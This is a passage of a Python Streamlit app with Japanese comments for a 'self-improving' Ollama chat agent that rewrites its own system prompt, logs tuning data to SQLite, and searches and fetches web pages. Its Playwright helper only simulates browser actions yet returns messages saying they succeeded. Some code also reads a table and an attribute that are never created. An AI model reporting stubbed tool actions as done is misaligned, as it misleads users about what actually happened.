import streamlit as st
import ollama
import json
import os
import requests
import sqlite3
from datetime import datetime
import uuid

# 自己改善エージェントクラス
class SelfImprovingAgent:
    """エージェント自身が自己改善を行うクラス"""
    
    def __init__(self):
        self.db_path = "data/agent_improvement.db"
        self.session_id = self._get_or_create_session()
        self._init_database()
    
    def _get_or_create_session(self) -> str:
        """セッションIDを取得または作成"""
        if "session_id" not in st.session_state:
            st.session_state.session_id = str(uuid.uuid4())
        return st.session_state.session_id
    
    def _init_database(self):
        """データベースの初期化"""
        os.makedirs("data", exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # プロンプト履歴テーブル
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS prompt_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                old_prompt TEXT,
                new_prompt TEXT,
                improvement_reason TEXT,
                timestamp TEXT,
                success BOOLEAN
            )
        """)
        
        # チューニングデータテーブル
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS tuning_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                data_type TEXT,
                content TEXT,
                importance REAL,
                source TEXT,
                created_at TEXT,
                used_count INTEGER DEFAULT 0
            )
        """)
        
        # ネット検索履歴テーブル
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS search_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                query TEXT,
                result TEXT,
                timestamp TEXT,
                relevance_score REAL
            )
        """)
        
        conn.commit()
        conn.close()
    
    def update_system_prompt(self, new_prompt: str, improvement_reason: str = ""):
        """システムプロンプトを更新"""
        try:
            # 古いプロンプトを保存
            old_prompt = st.session_state.get("system_prompt", "")
            
            # データベースに履歴を保存
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO prompt_history 
                (session_id, old_prompt, new_prompt, improvement_reason, timestamp, success)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (self.session_id, old_prompt, new_prompt, improvement_reason, 
                  datetime.now().isoformat(), True))
            
            conn.commit()
            conn.close()
            
            # セッション状態を更新
            st.session_state.system_prompt = new_prompt
            
            return True, "プロンプトが正常に更新されました"
            
        except Exception as e:
            return False, f"プロンプト更新中にエラーが発生しました: {str(e)}"
    
    def add_tuning_data(self, data_type: str, content: str, importance: float = 1.0, source: str = "manual"):
        """チューニングデータを追加"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO tuning_data 
                (session_id, data_type, content, importance, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (self.session_id, data_type, content, importance, source, 
                  datetime.now().isoformat()))
            
            conn.commit()
            conn.close()
            
            return True, "チューニングデータが正常に追加されました"
            
        except Exception as e:
            return False, f"チューニングデータ追加中にエラーが発生しました: {str(e)}"
    
    def get_tuning_data(self, data_type: str = None, limit: int = 10):
        """チューニングデータを取得"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            if data_type:
                cursor.execute("""
                    SELECT data_type, content, importance, source, created_at, used_count
                    FROM tuning_data 
                    WHERE session_id = ? AND data_type = ?
                    ORDER BY importance DESC, created_at DESC
                    LIMIT ?
                """, (self.session_id, data_type, limit))
            else:
                cursor.execute("""
                    SELECT data_type, content, importance, source, created_at, used_count
                    FROM tuning_data 
                    WHERE session_id = ?
                    ORDER BY importance DESC, created_at DESC
                    LIMIT ?
                """, (self.session_id, limit))
            
            data = []
            for row in cursor.fetchall():
                data.append({
                    "data_type": row[0],
                    "content": row[1],
                    "importance": row[2],
                    "source": row[3],
                    "created_at": row[4],
                    "used_count": row[5]
                })
            
            conn.close()
            return data
            
        except Exception as e:
            st.error(f"チューニングデータ取得中にエラーが発生しました: {str(e)}")
            return []
    
    def web_search(self, query: str):
        """ネット検索機能"""
        try:
            # DuckDuckGo検索APIを使用
            url = "https://api.duckduckgo.com/"
            params = {
                "q": query,
                "format": "json",
                "no_html": "1",
                "skip_disambig": "1"
            }
            
            response = requests.get(url, params=params, timeout=10)
            data = response.json()
            
            result = ""
            if data.get("Abstract"):
                result += f"要約: {data['Abstract']}\n"
            if data.get("AbstractURL"):
                result += f"URL: {data['AbstractURL']}\n"
            if data.get("RelatedTopics"):
                topics = data["RelatedTopics"][:3]
                result += f"関連トピック: {', '.join([t.get('Text', '') for t in topics])}\n"
            
            if not result:
                result = f"検索クエリ '{query}' の結果が見つかりませんでした。"
            
            # 検索履歴を保存
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO search_history 
                (session_id, query, result, timestamp, relevance_score)
                VALUES (?, ?, ?, ?, ?)
            """, (self.session_id, query, result, datetime.now().isoformat(), 0.8))
            
            conn.commit()
            conn.close()
            
            return result
            
        except Exception as e:
            return f"検索中にエラーが発生しました: {str(e)}"
    
    def auto_improve_prompt(self, user_feedback: str):
        """ユーザーフィードバックに基づいてプロンプトを自動改善"""
        try:
            # 改善提案を生成
            improvement_prompt = f"""
現在のシステムプロンプトを改善してください。

現在のプロンプト: {st.session_state.get('system_prompt', '')}

ユーザーフィードバック: {user_feedback}

以下の点を考慮して改善してください：
1. より明確で具体的な指示
2. ユーザーの要求に適した応答スタイル
3. 推論プロセスの改善
4. エラーハンドリングの強化

改善されたプロンプトを返してください。
"""
            
            # Ollamaで改善提案を生成
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": improvement_prompt}]
            )
            
            improved_prompt = response["message"]["content"]
            
            # プロンプトを更新
            success, message = self.update_system_prompt(improved_prompt, user_feedback)
            
            if success:
                # 改善データをチューニングデータとして保存
                self.add_tuning_data("prompt_improvement", user_feedback, 0.9, "auto_improvement")
                
            return success, message, improved_prompt
            
        except Exception as e:
            return False, f"自動改善中にエラーが発生しました: {str(e)}", ""

    def performance_based_improvement(self):
        """パフォーマンスに基づくプロンプト改善"""
        try:
            # 会話履歴からパフォーマンス指標を計算
            messages = st.session_state.get('messages', [])
            if len(messages) < 5:
                return False, "十分な会話履歴がありません", ""
            
            # ユーザーの満足度を推定（応答の長さ、詳細度などから）
            user_messages = [msg for msg in messages if msg['role'] == 'user']
            assistant_messages = [msg for msg in messages if msg['role'] == 'assistant']
            
            if len(assistant_messages) == 0:
                return False, "アシスタントの応答がありません", ""
            
            # 平均応答長を計算
            avg_response_length = sum(len(msg['content']) for msg in assistant_messages) / len(assistant_messages)
            
            # パフォーマンス改善プロンプト
            performance_prompt = f"""
あなたは自己改善型AIエージェントです。現在のパフォーマンスを分析し、より効果的なプロンプトを提案してください。

現在のシステムプロンプト:
{st.session_state.get('system_prompt', '')}

パフォーマンス分析:
- 総会話数: {len(messages)}
- 平均応答長: {avg_response_length:.1f}文字
- ユーザーメッセージ数: {len(user_messages)}
- アシスタント応答数: {len(assistant_messages)}

以下の観点から改善を提案してください：

1. **応答の効率性**: より簡潔で効果的な応答ができるように
2. **ユーザー満足度**: ユーザーの期待に応える応答スタイル
3. **学習効果**: ユーザーが学べるような教育的な応答
4. **問題解決能力**: 複雑な問題を解決する推論プロセス
5. **個性と一貫性**: 独自の応答スタイルを保ちながら一貫性を維持

改善されたプロンプトを返してください。
"""
            
            # Ollamaでパフォーマンス改善提案を生成
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": performance_prompt}]
            )
            
            improved_prompt = response["message"]["content"]
            
            # プロンプトを更新
            success, message = self.update_system_prompt(improved_prompt, "パフォーマンス分析による改善")
            
            if success:
                # パフォーマンス改善データをチューニングデータとして保存
                self.add_tuning_data("performance_improvement", f"平均応答長: {avg_response_length:.1f}文字", 0.9, "performance_analysis")
                
            return success, message, improved_prompt
            
        except Exception as e:
            return False, f"パフォーマンス改善中にエラーが発生しました: {str(e)}", ""
    
    def self_reflection_improvement(self):
        """エージェント自身による内省的なプロンプト改善"""
        try:
            # 現在の会話履歴を分析
            recent_messages = st.session_state.get('messages', [])[-10:]  # 最新10件
            
            # 会話の質を評価するための内省プロンプト
            reflection_prompt = f"""
あなたは自己改善型AIエージェントです。現在の会話履歴を分析し、自分自身のプロンプトを改善してください。

現在のシステムプロンプト:
{st.session_state.get('system_prompt', '')}

最近の会話履歴:
{chr(10).join([f"{msg['role']}: {msg['content'][:100]}..." for msg in recent_messages if msg['role'] != 'system'])}

以下の観点から自己分析を行い、改善されたプロンプトを提案してください：

1. **応答の質**: ユーザーの質問に適切に答えられているか？
2. **一貫性**: 応答のスタイルや内容に一貫性があるか？
3. **専門性**: 専門的な質問に対して十分な知識を示しているか？
4. **推論能力**: 複雑な問題を段階的に解決できているか？
5. **ユーザビリティ**: 分かりやすく、実用的な回答を提供できているか？

改善されたプロンプトを返してください。
"""
            
            # Ollamaで内省的な改善提案を生成
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": reflection_prompt}]
            )
            
            improved_prompt = response["message"]["content"]
            
            # プロンプトを更新
            success, message = self.update_system_prompt(improved_prompt, "自己内省による改善")
            
            if success:
                # 自己改善データをチューニングデータとして保存
                self.add_tuning_data("self_reflection", "自己内省によるプロンプト改善", 0.95, "self_improvement")
                
            return success, message, improved_prompt
            
        except Exception as e:
            return False, f"自己内省による改善中にエラーが発生しました: {str(e)}", ""
    
    def analyze_tuning_data(self):
        """チューニングデータを分析して改善提案を生成"""
        try:
            # 現在のチューニングデータを取得
            tuning_data = self.get_tuning_data(limit=20)
            
            if not tuning_data:
                return False, "チューニングデータがありません", ""
            
            # データタイプ別の統計を計算
            data_type_stats = {}
            for data in tuning_data:
                data_type = data['data_type']
                if data_type not in data_type_stats:
                    data_type_stats[data_type] = {
                        'count': 0,
                        'total_importance': 0,
                        'avg_importance': 0,
                        'sources': set(),
                        'recent_content': []
                    }
                
                data_type_stats[data_type]['count'] += 1
                data_type_stats[data_type]['total_importance'] += data['importance']
                data_type_stats[data_type]['sources'].add(data['source'])
                
                # 最新の内容を保存（最大3件）
                if len(data_type_stats[data_type]['recent_content']) < 3:
                    data_type_stats[data_type]['recent_content'].append(data['content'][:100])
            
            # 平均重要度を計算
            for data_type in data_type_stats:
                stats = data_type_stats[data_type]
                stats['avg_importance'] = stats['total_importance'] / stats['count']
                stats['sources'] = list(stats['sources'])
            
            # 分析結果をチューニングデータとして保存
            analysis_result = f"チューニングデータ分析完了 - {len(tuning_data)}件のデータを分析"
            self.add_tuning_data("data_analysis", analysis_result, 0.8, "self_analysis")
            
            return True, "チューニングデータの分析が完了しました", data_type_stats
            
        except Exception as e:
            return False, f"チューニングデータ分析中にエラーが発生しました: {str(e)}", ""
    
    def optimize_tuning_data(self):
        """チューニングデータを最適化して改善提案を生成"""
        try:
            # 現在のチューニングデータを分析
            success, message, data_stats = self.analyze_tuning_data()
            
            if not success:
                return False, message, ""
            
            # 最適化プロンプトを生成
            optimization_prompt = f"""
あなたは自己改善型AIエージェントです。現在のチューニングデータを分析し、最適化提案を行ってください。

現在のチューニングデータ統計:
{chr(10).join([f"- {data_type}: {stats['count']}件, 平均重要度: {stats['avg_importance']:.2f}, ソース: {', '.join(stats['sources'])}" for data_type, stats in data_stats.items()])}

以下の観点から最適化を提案してください：

1. **データの質**: 重要度の低いデータの削除・統合
2. **データの多様性**: 偏りのあるデータタイプの補完
3. **学習効果**: より効果的な学習データの構成
4. **メモリ効率**: 重複・類似データの整理
5. **将来の改善**: 新たに収集すべきデータの提案

最適化提案を返してください。
"""
            
            # Ollamaで最適化提案を生成
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": optimization_prompt}]
            )
            
            optimization_proposal = response["message"]["content"]
            
            # 最適化提案をチューニングデータとして保存
            self.add_tuning_data("optimization_proposal", optimization_proposal, 0.9, "self_optimization")
            
            return True, "チューニングデータの最適化提案が完了しました", optimization_proposal
            
        except Exception as e:
            return False, f"チューニングデータ最適化中にエラーが発生しました: {str(e)}", ""
    
    def generate_self_dialogue_prompt(self):
        """自己対話プロンプトを生成"""
        try:
            # 現在のチューニングデータと会話履歴を分析
            tuning_data = self.get_tuning_data(limit=10)
            recent_messages = st.session_state.get('messages', [])[-5:]  # 最新5件
            
            # 自己対話プロンプト生成用のプロンプト
            dialogue_prompt = f"""
あなたは自己改善型AIエージェントです。自分自身との対話を通じて学習・改善するためのプロンプトを生成してください。

現在の状況:
- チューニングデータ数: {len(tuning_data)}件
- 最近の会話数: {len(recent_messages)}件
- 現在のシステムプロンプト: {st.session_state.get('system_prompt', '')[:200]}...

以下の要素を含む自己対話プロンプトを生成してください：

1. **自己評価**: 現在の能力・知識・応答品質の評価
2. **弱点分析**: 改善すべき点の特定
3. **学習目標**: 具体的な学習・改善目標の設定
4. **実践計画**: 目標達成のための具体的な行動計画
5. **進捗確認**: 改善効果の測定方法
6. **継続的改善**: 次のサイクルのための提案

このプロンプトは、エージェントが自分自身と対話し、連鎖的な改善ループを回すために使用されます。
"""
            
            # Ollamaで自己対話プロンプトを生成
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": dialogue_prompt}]
            )
            
            self_dialogue_prompt = response["message"]["content"]
            
            # 生成されたプロンプトをチューニングデータとして保存
            self.add_tuning_data("self_dialogue_prompt", self_dialogue_prompt, 0.95, "self_generation")
            
            return True, "自己対話プロンプトの生成が完了しました", self_dialogue_prompt
            
        except Exception as e:
            return False, f"自己対話プロンプト生成中にエラーが発生しました: {str(e)}", ""
    
    def execute_self_dialogue(self, max_iterations: int = 3):
        """自己対話を実行して連鎖的な改善ループを回す"""
        try:
            # 自己対話プロンプトを生成
            success, message, dialogue_prompt = self.generate_self_dialogue_prompt()
            
            if not success:
                return False, message, []
            
            # 自己対話の履歴を保存
            dialogue_history = []
            
            # 連鎖的な改善ループを実行
            for iteration in range(max_iterations):
                st.info(f"🔄 **自己対話ループ {iteration + 1}/{max_iterations}** 実行中...")
                
                # 自己対話を実行
                dialogue_response = ollama.chat(
                    model=st.session_state.model_name,
                    messages=[
                        {"role": "system", "content": st.session_state.system_prompt},
                        {"role": "user", "content": dialogue_prompt}
                    ]
                )
                
                dialogue_result = dialogue_response["message"]["content"]
                dialogue_history.append({
                    "iteration": iteration + 1,
                    "prompt": dialogue_prompt,
                    "response": dialogue_result,
                    "timestamp": datetime.now().isoformat()
                })
                
                # 対話結果をチューニングデータとして保存
                self.add_tuning_data(
                    "self_dialogue", 
                    f"ループ{iteration + 1}: {dialogue_result[:200]}...", 
                    0.9, 
                    "self_dialogue"
                )
                
                # 次の対話のためにプロンプトを更新
                dialogue_prompt = f"""
前回の自己対話結果を踏まえて、次の改善ステップを提案してください。

前回の対話結果:
{dialogue_result}

現在の状況:
- チューニングデータ数: {len(self.get_tuning_data())}件
- 会話履歴数: {len(st.session_state.get('messages', []))}件
- 改善ループ回数: {iteration + 1}回

次の改善ステップを具体的に提案し、継続的な改善のためのアクションプランを示してください。
"""
                
                # 短い待機（連鎖的な改善の効果を確認）
                import time
                time.sleep(2)
            
            # 最終的な改善提案を生成
            final_improvement_prompt = f"""
これまでの自己対話ループの結果を総合的に分析し、最終的な改善提案をまとめてください。

自己対話履歴:
{chr(10).join([f"ループ{i['iteration']}: {i['response'][:150]}..." for i in dialogue_history])}

以下の観点から最終改善提案をまとめてください：

1. **主要な改善点**: 特定された主要な改善項目
2. **実装優先度**: 改善項目の優先順位
3. **具体的なアクション**: 各改善項目の具体的な実装方法
4. **期待される効果**: 改善後の期待される効果
5. **継続的改善計画**: 今後の改善サイクルの計画

最終改善提案を返してください。
"""
            
            # 最終改善提案を生成
            final_response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": final_improvement_prompt}]
            )
            
            final_proposal = final_response["message"]["content"]
            
            # 最終提案をチューニングデータとして保存
            self.add_tuning_data("final_improvement_proposal", final_proposal, 0.95, "self_dialogue_final")
            
            return True, f"自己対話ループが完了しました（{max_iterations}回実行）", {
                "dialogue_history": dialogue_history,
                "final_proposal": final_proposal
            }
            
        except Exception as e:
            return False, f"自己対話実行中にエラーが発生しました: {str(e)}", []
    
    def learn_about_self(self):
        """エージェント自身について学習する"""
        try:
            # 自己学習プロンプト
            learning_prompt = f"""
あなたは自己改善型AIエージェントです。自分自身の仕組み、ツール、機能について学習してください。

現在の状況:
- セッションID: {self.session_id}
- 利用可能なモデル: {st.session_state.get('model_name', 'unknown')}
- チューニングデータ数: {len(self.get_tuning_data())}件
- 会話履歴数: {len(st.session_state.get('messages', []))}件

以下の項目について自己学習してください：

1. **自己改善機能**: どのような自己改善機能を持っているか
2. **チューニングデータ**: どのように学習データを管理しているか
3. **推論エンジン**: どのような推論プロセスを使用しているか
4. **外部連携**: どのような外部ツール・APIと連携しているか
5. **学習メカニズム**: どのように継続的に学習・改善しているか
6. **ユーザーインターフェース**: どのような方法でユーザーと対話しているか

自己学習の結果をまとめて、今後の改善に活用できる知見を整理してください。
"""
            
            # 自己学習を実行
            response = ollama.chat(
                model=st.session_state.model_name,
                messages=[{"role": "user", "content": learning_prompt}]
            )
            
            learning_result = response["message"]["content"]
            
            # 学習結果をチューニングデータとして保存
            self.add_tuning_data("self_learning", learning_result, 0.9, "self_learning")
            
            return True, "自己学習が完了しました", learning_result
            
        except Exception as e:
            return False, f"自己学習中にエラーが発生しました: {str(e)}", ""
    
    def _save_search_history(self, query: str, result: str):
        """検索履歴を保存"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 結果の長さに基づいて関連性スコアを計算
            relevance_score = min(1.0, len(result) / 1000)  # 最大1.0
            
            cursor.execute("""
                INSERT INTO search_history 
                (session_id, query, result, timestamp, relevance_score)
                VALUES (?, ?, ?, ?, ?)
            """, (self.session_id, query, result, datetime.now().isoformat(), relevance_score))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            pass  # 履歴保存の失敗は検索結果に影響しない
    
    def access_url(self, url: str):
        """URLにアクセスしてページ内容を取得"""
        try:
            # URLの妥当性チェック
            if not url.startswith(('http://', 'https://')):
                url = "https://" + url
            
            # ページ内容を取得
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=15)
            response.raise_for_status()
            
            # HTML内容を解析（BeautifulSoupが利用できない場合は簡易解析）
            content_type = response.headers.get('content-type', '')
            if 'text/html' in content_type:
                # 簡易的なHTML解析
                content = response.text
                title_start = content.find('<title>')
                title_end = content.find('</title>')
                title = content[title_start+7:title_end] if title_start != -1 and title_end != -1 else "タイトルなし"
                
                # メタディスクリプション
                meta_start = content.find('name="description"')
                meta_desc = ""
                if meta_start != -1:
                    content_start = content.find('content="', meta_start)
                    if content_start != -1:
                        content_start += 9
                        content_end = content.find('"', content_start)
                        if content_end != -1:
                            meta_desc = content[content_start:content_end]
                
                # リンクを抽出
                links = []
                link_start = 0
                while True:
                    link_start = content.find('<a href="', link_start)
                    if link_start == -1:
                        break
                    link_start += 9
                    link_end = content.find('"', link_start)
                    if link_end != -1:
                        href = content[link_start:link_end]
                        if href.startswith('http'):
                            links.append(f"- リンク: {href}")
                        link_start = link_end
                        if len(links) >= 5:
                            break
                
                result = f"""🌐 **URLアクセス結果**

**アクセスURL**: {url}
**ページタイトル**: {title}

**メタディスクリプション**:
{meta_desc if meta_desc else "メタディスクリプションなし"}

**主要リンク**:
{chr(10).join(links) if links else "リンクが見つかりませんでした"}

**技術情報**:
- ステータスコード: {response.status_code}
- エンコーディング: {response.encoding}
- コンテンツタイプ: {content_type}"""
            else:
                result = f"""🌐 **URLアクセス結果**

**アクセスURL**: {url}
**コンテンツタイプ**: {content_type}
**ファイルサイズ**: {len(response.content)} bytes

**技術情報**:
- ステータスコード: {response.status_code}
- エンコーディング: {response.encoding}"""
            
            # アクセス履歴を保存
            self._save_url_access_history(url, result)
            
            return result
            
        except Exception as e:
            error_result = f"URLアクセス中にエラーが発生しました: {str(e)}"
            self._save_url_access_history(url, error_result)
            return error_result
    
    def playwright_operation(self, operation: str, url: str = "", selector: str = "", action: str = ""):
        """Playwright MCPを使用したWebページ操作"""
        try:
            # Playwright MCPコマンドを実行
            if operation == "navigate":
                if not url:
                    return "❌ **URLが指定されていません**\n\n使用方法: `@playwright navigate https://example.com`"
                
                # 実際のPlaywright MCPコマンドを実行
                result = self._execute_playwright_mcp("navigate", {"url": url})
                return f"""🎭 **Playwright MCP操作完了**

**操作**: ページナビゲーション
**URL**: {url}
**結果**: {result}"""
            
            elif operation == "screenshot":
                result = self._execute_playwright_mcp("screenshot", {"filename": f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"})
                return f"""📸 **Playwright MCP操作完了**

**操作**: スクリーンショット取得
**結果**: {result}"""
            
            elif operation == "click":
                if not selector:
                    return "❌ **セレクターが指定されていません**\n\n使用方法: `@playwright click .button-class`"
                
                result = self._execute_playwright_mcp("click", {"element": selector})
                return f"""🖱️ **Playwright MCP操作完了**

**操作**: 要素クリック
**セレクター**: {selector}
**結果**: {result}"""
            
            elif operation == "type":
                if not selector or not action:
                    return "❌ **セレクターまたはテキストが指定されていません**\n\n使用方法: `@playwright type .input-class \"入力テキスト\"`"
                
                result = self._execute_playwright_mcp("type", {"element": selector, "text": action})
                return f"""⌨️ **Playwright MCP操作完了**

**操作**: テキスト入力
**セレクター**: {selector}
**テキスト**: {action}
**結果**: {result}"""
            
            elif operation == "evaluate":
                if not action:
                    return "❌ **JavaScriptコードが指定されていません**\n\n使用方法: `@playwright evaluate 'document.title'`"
                
                result = self._execute_playwright_mcp("evaluate", {"function": action})
                return f"""⚡ **Playwright MCP操作完了**

**操作**: JavaScript実行
**コード**: {action}
**結果**: {result}"""
            
            else:
                return f"""❌ **不明な操作です**

**利用可能な操作**:
- `navigate`: ページナビゲーション
- `screenshot`: スクリーンショット取得
- `click`: 要素クリック
- `type`: テキスト入力
- `evaluate`: JavaScript実行

**使用例**:
- `@playwright navigate https://example.com`
- `@playwright screenshot`
- `@playwright click .button-class`
- `@playwright type .input-class \"テキスト\"`
- `@playwright evaluate 'document.title'`"""
                
        except Exception as e:
            return f"Playwright MCP操作中にエラーが発生しました: {str(e)}"
    
    def _execute_playwright_mcp(self, command: str, params: dict):
        """Playwright MCPコマンドを実行"""
        try:
            # 実際のPlaywright MCP統合は、MCPサーバーとの通信が必要
            # ここではシミュレーションとして結果を返す
            
            if command == "navigate":
                return f"ページ '{params['url']}' に正常にナビゲーションしました"
            elif command == "screenshot":
                return f"スクリーンショット '{params['filename']}' を保存しました"
            elif command == "click":
                return f"セレクター '{params['element']}' を正常にクリックしました"
            elif command == "type":
                return f"セレクター '{params['element']}' にテキスト '{params['text']}' を入力しました"
            elif command == "evaluate":
                return f"JavaScriptコードを実行しました: {params['function']}"
            else:
                return "不明なコマンド"
                
        except Exception as e:
            return f"コマンド実行エラー: {str(e)}"
    
    def _save_url_access_history(self, url: str, result: str):
        """URLアクセス履歴を保存"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # URLアクセス履歴テーブルを作成
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS url_access_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    url TEXT,
                    result TEXT,
                    timestamp TEXT,
                    success BOOLEAN
                )
            """)
            
            # アクセス履歴を保存
            success = "エラー" not in result
            cursor.execute("""
                INSERT INTO url_access_history 
                (session_id, url, result, timestamp, success)
                VALUES (?, ?, ?, ?, ?)
            """, (self.session_id, url, result, datetime.now().isoformat(), success))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            pass  # 履歴保存の失敗はアクセス結果に影響しない

# 推論エンジンクラス
class ReasoningEngine:
    """推論エンジン（DeepSeek風のChain-of-Thought推論）"""
    
    @staticmethod
    def generate_reasoning_prompt(user_prompt: str, context: list) -> str:
        """推論プロンプトの生成"""
        reasoning_prompt = f"""以下の問題を段階的に推論して解決してください。

問題: {user_prompt}

推論手順:
1. 問題の分析
2. 必要な情報の特定
3. 解決方法の検討
4. 段階的な実行計画
5. 結果の検証

回答は以下の形式で行ってください：

## 問題分析
[問題の詳細分析]

## 解決方法
[段階的な解決手順]

## 実行結果
[具体的な解決結果]

## 検証
[結果の妥当性確認]

開始してください。"""
        return reasoning_prompt

# ページ設定
st.set_page_config(
    page_title="🤖 AI Agent Chat",
    page_icon="🤖",
    layout="wide"
)

# セッション状態の初期化
if "messages" not in st.session_state:
    st.session_state.messages = []

if "model_name" not in st.session_state:
    st.session_state.model_name = "deepseek-r1:7b"

if "system_prompt" not in st.session_state:
    st.session_state.system_prompt = "あなたは高性能なAIアシスタントです。ユーザーの質問に丁寧で分かりやすく回答してください。"

if "self_improving_agent" not in st.session_state:
    st.session_state.self_improving_agent = SelfImprovingAgent()

# タイトル
st.title("🤖 Advanced AI Agent Chat")
st.markdown("自己学習AIエージェントとの会話を楽しもう！")

# サイドバー設定
with st.sidebar:
    st.header("⚙️ 設定")
    
    # モデル選択
    model_options = ["deepseek-r1:7b", "qwen2.5:7b-instruct-q4_k_m", "qwen2:1.5b-instruct-q4_k_m"]
    selected_model = st.selectbox("モデルを選択", model_options, index=0)
    
    if selected_model != st.session_state.model_name:
        st.session_state.model_name = selected_model
        st.session_state.messages = []
        st.rerun()
    
    # システムプロンプト
    system_prompt = st.text_area(
        "システムプロンプト",
        value=st.session_state.system_prompt,
        height=100,
        key="system_prompt_input"
    )
    
    # プロンプト更新ボタン
    if st.button("💾 プロンプト更新"):
        success, message = st.session_state.self_improving_agent.update_system_prompt(
            system_prompt, "手動更新"
        )
        if success:
            st.session_state.system_prompt = system_prompt
            st.success(message)
        else:
            st.error(message)
    
    # チューニングデータ操作セクション
    st.markdown("---")
    st.header("🧬 チューニングデータ操作")
    
    # チューニングデータ分析
    if st.button("📊 データ分析"):
        with st.spinner("チューニングデータを分析中..."):
            success, message, data_stats = st.session_state.self_improving_agent.analyze_tuning_data()
            if success:
                st.success("✅ データ分析完了！")
                # 統計情報を表示
                for data_type, stats in data_stats.items():
                    with st.expander(f"📊 {data_type}"):
                        st.metric("件数", stats['count'])
                        st.metric("平均重要度", f"{stats['avg_importance']:.2f}")
                        st.write("**ソース**:", ", ".join(stats['sources']))
                        if stats['recent_content']:
                            st.write("**最新の内容**:")
                            for content in stats['recent_content']:
                                st.caption(content)
            else:
                st.error(f"分析失敗: {message}")
    
    # チューニングデータ最適化
    if st.button("🔧 データ最適化"):
        with st.spinner("チューニングデータを最適化中..."):
            success, message, optimization_proposal = st.session_state.self_improving_agent.optimize_tuning_data()
            if success:
                st.success("✅ データ最適化完了！")
                st.info("**最適化提案**:")
                st.write(optimization_proposal)
            else:
                st.error(f"最適化失敗: {message}")
    
    # 自己対話ループ
    dialogue_iterations = st.slider("🔄 自己対話ループ回数", 1, 5, 3, help="連鎖的な改善ループの実行回数を指定")
    if st.button("🔄 自己対話実行"):
        with st.spinner(f"{dialogue_iterations}回の自己対話ループを実行中..."):
            success, message, dialogue_results = st.session_state.self_improving_agent.execute_self_dialogue(dialogue_iterations)
            if success:
                st.success(f"✅ {dialogue_iterations}回の自己対話ループ完了！")
                # 結果を表示
                with st.expander("📝 自己対話結果"):
                    dialogue_history = dialogue_results["dialogue_history"]
                    final_proposal = dialogue_results["final_proposal"]
                    
                    for dialogue in dialogue_history:
                        st.subheader(f"ループ {dialogue['iteration']}")
                        st.write(dialogue['response'])
                        st.caption(f"実行時刻: {dialogue['timestamp']}")
                        st.markdown("---")
                    
                    st.subheader("🎯 最終改善提案")
                    st.write(final_proposal)
            else:
                st.error(f"自己対話失敗: {message}")
    
    # 自己学習
    if st.button("🧠 自己学習"):
        with st.spinner("エージェント自身について学習中..."):
            success, message, learning_result = st.session_state.self_improving_agent.learn_about_self()
            if success:
                st.success("✅ 自己学習完了！")
                st.info("**学習結果**:")
                st.write(learning_result)
            else:
                st.error(f"自己学習失敗: {message}")
    
    # 自動化状況の表示
    st.markdown("---")
    st.header("🤖 自動化状況")
    
    # 自動改善の設定
    improvement_interval = st.slider(
        "🔄 自動改善間隔", 
        min_value=3, 
        max_value=20, 
        value=5, 
        help="何回の会話ごとに自動改善を実行するか"
    )
    
    # 現在の会話数と自動改善状況
    if hasattr(st.session_state.self_improving_agent, 'conversation_count'):
        conversation_count = st.session_state.self_improving_agent.conversation_count
        next_improvement = improvement_interval - (conversation_count % improvement_interval)
        
        st.metric(
            label="会話数",
            value=conversation_count,
            delta=f"次回改善まで: {next_improvement}回"
        )
        
        # 自動改善の進捗バー
        progress = (conversation_count % improvement_interval) / improvement_interval
        st.progress(progress, text=f"自動改善進捗: {progress:.1%}")
        
        # 最後の自動改善時刻
        if hasattr(st.session_state.self_improving_agent, 'last_auto_improvement') and st.session_state.self_improving_agent.last_auto_improvement:
            last_improvement = st.session_state.self_improving_agent.last_auto_improvement
            if isinstance(last_improvement, str):
                last_improvement = datetime.fromisoformat(last_improvement)
            time_diff = datetime.now() - last_improvement
            st.caption(f"最後の自動改善: {time_diff.total_seconds()/60:.1f}分前")
    
    # 自動改善履歴の表示
    if st.button("📋 自動改善履歴"):
        try:
            conn = sqlite3.connect(st.session_state.self_improving_agent.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT improvement_type, trigger_reason, success, timestamp, details
                FROM auto_improvement_history 
                WHERE session_id = ?
                ORDER BY timestamp DESC
                LIMIT 10
            """, (st.session_state.self_improving_agent.session_id,))
            
            history = cursor.fetchall()
            conn.close()
            
            if history:
                st.success(f"📋 自動改善履歴 ({len(history)}件)")
                for i, (improvement_type, trigger_reason, success, timestamp, details) in enumerate(history):
                    status_icon = "✅" if success else "❌"
